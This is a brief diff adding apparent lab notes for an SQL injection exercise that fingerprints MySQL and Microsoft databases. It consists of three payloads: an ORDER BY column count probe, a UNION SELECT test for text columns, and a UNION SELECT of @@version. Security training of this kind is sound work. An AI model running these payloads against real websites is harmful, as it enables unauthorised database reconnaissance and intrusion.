@@ -1,0 +1,10 @@
+Lab #07: SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+Finding the number of columns
+' order by 2--+-
+
+Column containing the text
+' union select 'a','b'--+-
+
+Printing the version of database
+' union select @@version,'b'--+-
